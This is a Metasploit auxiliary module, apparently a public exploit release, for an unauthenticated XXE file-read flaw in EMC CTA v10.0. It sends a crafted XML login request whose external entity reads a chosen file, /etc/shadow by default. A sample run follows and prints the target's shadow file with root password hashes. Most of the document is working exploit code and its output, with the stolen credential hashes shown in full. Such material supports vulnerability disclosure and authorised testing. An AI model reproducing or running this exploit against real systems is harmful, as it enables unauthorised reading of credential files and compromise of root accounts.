require 'msf/core'
 
 
class Metasploit3 < Msf::Auxiliary
 
include Msf::Exploit::Remote::HttpClient
 
def initialize(info = {})
super(update_info(info,
'Name' => 'EMC CTA Unauthenticated XXE Arbitrary File Read',
'Description' => %q{
EMC CTA v10.0 is susceptible to an unauthenticated XXE attack
that allows an attacker to read arbitrary files from the file system
with the permissions of the root user.
},
'License' => MSF_LICENSE,
'Author' =>
[
'Brandon Perry <bperry.volatile@gmail.com>', #metasploit module
],
'References' =>
[
],
'DisclosureDate' => 'Mar 31 2014'
))
 
register_options(
[
OptString.new('TARGETURI', [ true, "Base directory path", '/']),
OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/shadow"]),
], self.class)
end
 
def run
pay = %Q{<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file://#{datastore['FILEPATH']}" >]>
<Request>
<Username>root</Username>
<Password>&xxe;</Password>
</Request>
}
 
res = send_request_cgi({
'uri' => normalize_uri(target_uri.path, 'api', 'login'),
'method' => 'POST',
'data' => pay
})
 
file = /For input string: "(.*)"/m.match(res.body)
file = file[1]
 
path = store_loot('emc.file', 'text/plain', datastore['RHOST'], file, datastore['FILEPATH'])
 
print_good("File saved to: " + path)
end
end
 
----------------------------------------------------------------
 
Quick run:
 
msf auxiliary(emc_cta_xxe) > show options
 
Module options (auxiliary/gather/emc_cta_xxe):
 
Name Current Setting Required Description
---- --------------- -------- -----------
FILEPATH /etc/shadow yes The filepath to read on the server
Proxies http:127.0.0.1:8080 no Use a proxy chain
RHOST 172.31.16.99 yes The target address
RPORT 443 yes The target port
TARGETURI / yes Base directory path
VHOST no HTTP server virtual host
 
msf auxiliary(emc_cta_xxe) > run
 
[+] File saved to: /home/bperry/.msf4/loot/20140331082903_default_172.31.16.99_emc.file_935159.txt
[*] Auxiliary module execution completed
msf auxiliary(emc_cta_xxe) > cat /home/bperry/.msf4/loot/20140331082903_default_172.31.16.99_emc.file_935159.txt
[*] exec: cat /home/bperry/.msf4/loot/20140331082903_default_172.31.16.99_emc.file_935159.txt
 
root:u4sA.C2vNqNF.:15913::::::
bin:*:15913:0:99999:0:0::
daemon:*:15913:0:99999:0:0::
lp:*:15913:0:99999:0:0::
mail:*:15913:0:99999:0:0::
news:*:15913:0:99999:0:0::
uucp:*:15913:0:99999:0:0::
man:*:15913:0:99999:0:0::
wwwrun:*:15913:0:99999:0:0::
ftp:*:15913:0:99999:0:0::
nobody:*:15913:0:99999:0:0::
messagebus:*:15913:0:99999:0:0::
polkituser:*:15913:0:99999:0:0::
haldaemon:*:15913:0:99999:0:0::
sshd:*:15913:0:99999:0:0::
uuidd:*:15913:0:99999:0:0::
postgres:*:15913:0:99999:0:0::
ntp:*:15913:0:99999:0:0::
suse-ncc:*:15913:0:99999:0:0::
super:u4sA.C2vNqNF.:15913:0:99999:0:0::
msf auxiliary(emc_cta_xxe) >
